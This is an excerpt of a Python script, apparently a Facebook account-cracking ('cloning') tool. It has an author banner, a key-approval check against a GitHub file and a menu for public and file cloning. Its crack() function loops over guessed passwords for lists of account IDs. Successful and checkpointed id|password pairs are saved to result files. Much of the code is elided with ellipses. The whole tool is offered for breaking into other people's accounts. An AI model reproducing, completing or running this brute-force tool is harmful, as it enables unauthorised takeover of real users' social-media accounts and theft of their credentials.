...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKRISHNA')
...
os.system("clear")
banner1()
nm = input('\x1b[1;97m [•] ENTER YOUR NAME: ')

def banner():
	os.system("clear")
	print(f"""\x1b[1;97m\n   ##########  \n  #£££££££    ## \n  ## #       \n   ###### &&&&&&&&&&&##  \n        ##&&&&&&\n  ##    ## #    ## \n   ######  #######\n===============================================\n [•] AUTHOR    :  KRISHNA\n [•] GITHUB    :  KR1SHNA404\n [•] TELEGRAM  : @u_nkno_wn""")
	print(' [•] USERNAME  :  '+str(nm))
	print("""===============================================""")

def approval():
  uuid = " Y"+str(os.geteuid())+"X9G"+str(os.geteuid())
  id = "KRISHNA"+"".join(uuid)+"3Y-"
  os.system('clear')
  banner()
  print("\033[1;37m [•] WELCOME "+str(nm))
  print("\033[1;37m [•] YOU NEED APPROVAL TO USE THIS TOOL   \033[1;37m")
  print("\033[1;37m [•] YOUR KEY:\x1b[1;92m "+id);time.sleep(0.1)
  print ("""\033[1;37m===============================================""")
  try:
    httpCaht = requests.get("https://github.com/Rakshshah/APPROVE/edit/main/KEYS").text
    if id in httpCaht:
      KRISHNAj("\033[1;97m [•] CONGRALUTATIONS !!!YOUR KEY WAS APROVED")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      KRISHNAj("\x1b[1;97m [×] SORRY "+str(nm))
      KRISHNAj("\x1b[1;97m [•] YOUR KEY WAS NOT APPROVED ")
      print("\033[1;37m [•] COPY YOUR KEY AND SEND TO ADMIN"); time.sleep(0.1)
      input(' [•] CLICK. ENTER TO SEND YOUR KEY ')
      os.system('xdg-open https://www.facebook.com/itx.KRISHNA')
      time.sleep(1)
      sys.exit()
  except: 
    sys.exit() 
...
def loginc():
	try:
		...
		print(f'  {u}[{h}KRISHNA{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	KRISHNAj('\x1b[1;97m [1] PUBLIC CLONING\n [2] FILE CLONING\n [3] CHECK RESULTS\n [4] CONTACT WITH ADMIN\n [0] EXIT ')
	KRISHNAj('------------------------------------------------')
	KRISHNA= input('\x1b[1;92m [•] CHOOSE: ');time.sleep(0.01)
	if KRISHNA in ['1']:
		public()
	elif KRISHNA in ['2']:
		crack_file()
	elif KRISHNA in ['3','03']:
		result()
	elif KRISHNA in ['4','04']:
		os.system('xdg-open https://www.facebook.com/itx.KRISHNA')
	elif KRISHNA in ['0']:
...
def passwrd():
	os.system('clear')
	banner()
	print("\x1b[1;97m USE MOBILE DATA\033[1;37m")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [KRISHNA] {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} CP{P}={P}{cp}{x} {P}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{k} [KRISHNA-CP] {idf}  {pw} {N}')     
				open('KRISHNA-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r{H} [KRISHNA-OK] {idf}  {pw}')
				open('KRISHNA-OK/'+okc,'a').write(idf+'|'+pw+'\n')
